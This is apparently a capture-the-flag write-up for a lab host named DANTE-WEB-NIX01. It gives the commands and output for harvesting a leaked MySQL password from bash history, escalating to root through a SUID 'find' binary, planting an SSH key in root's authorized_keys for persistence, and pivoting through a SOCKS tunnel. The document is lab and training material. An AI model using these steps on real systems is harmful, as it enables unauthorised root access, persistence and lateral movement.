# Lateral Movement
## Bash History
```
james@DANTE-WEB-NIX01:/home$ cat james/.bash_history
```
```
cat james/.bash_history
cd /home/balthazar
rm .mysql_history
mysql -u balthazar -p TheJoker12345!
```

## Find SUID
```
$ find / -perm -4000 -ls 2>/dev/null
```
```
   525090     56 -rwsr-xr-x   1 root     root        55528 Apr  2  2020 /usr/bin/mount
   524495     52 -rwsr-xr-x   1 root     root        53040 Apr 16  2020 /usr/bin/chsh
   525249     32 -rwsr-xr-x   1 root     root        31032 Aug 16  2019 /usr/bin/pkexec
   525472     68 -rwsr-xr-x   1 root     root        67816 Apr  2  2020 /usr/bin/su
   524676     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
   525571     40 -rwsr-xr-x   1 root     root        39144 Apr  2  2020 /usr/bin/umount
   525125     44 -rwsr-xr-x   1 root     root        44784 Apr 16  2020 /usr/bin/newgrp
   537194     16 -rwsr-xr-x   1 root     root        14560 Mar  9  2020 /usr/bin/vmware-user-suid-wrapper
   524489     84 -rwsr-xr-x   1 root     root        85064 Apr 16  2020 /usr/bin/chfn
   524757     88 -rwsr-xr-x   1 root     root        88464 Apr 16  2020 /usr/bin/gpasswd
   525195     68 -rwsr-xr-x   1 root     root        68208 Apr 16  2020 /usr/bin/passwd
   524637    316 -rwsr-xr-x   1 root     root       320160 Feb 17  2020 /usr/bin/find
```

# Privilege Escalation
## Find SUID misconfiguration
```
james@DANTE-WEB-NIX01:/home$ find . -exec /bin/bash -p \; -quit
find . -exec /bin/bash -p \; -quit
bash-5.0# id
id
uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james)

```
```
bash-5.0# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.1.100  netmask 255.255.255.0  broadcast 172.16.1.255
        inet6 fe80::250:56ff:feb9:7a74  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:7a:74  txqueuelen 1000  (Ethernet)
        RX packets 484692  bytes 92949307 (92.9 MB)
        RX errors 0  dropped 68  overruns 0  frame 0
        TX packets 389672  bytes 346157599 (346.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4815  bytes 442456 (442.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4815  bytes 442456 (442.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Add SSH Connection
**Generate SSH Key in HOST**
```
$ ssh-keygen -b 4096
$ cat ~/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEEljGcqu6LAIDeTnlO/+wDg+mB9e+uu2uuxCka/Psu kali@kali
```

**Add Public Key to TARGET**
```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEEljGcqu6LAIDeTnlO/+wDg+mB9e+uu2uuxCka/Psu" >> /root/.ssh/authorized_keys
<g+mB9e+uu2uuxCka/Psu" >> /root/.ssh/authorized_keys
```

**Then connect to Target**
```
$ ssh -i ~/.ssh/id_ed25519 root@10.10.110.100
```

## Create SSH Tunnel
Edit /etc/proxychains.conf file to proxy requests through SOCKS port 1080
```
socks5 127.0.0.1 1080
```

SSH Connect with -D Options
```
ssh -i ~/.ssh/id_ed25519 -D 1080 root@10.10.110.100
```
```
root@DANTE-WEB-NIX01:~# ls
flag.txt  snap  wordpress_backup  wordpress.tar.bz2
root@DANTE-WEB-NIX01:~# cat flag.txt 
DANTE{Too_much_Pr1v!!!!}
root@DANTE-WEB-NIX01:~# 
```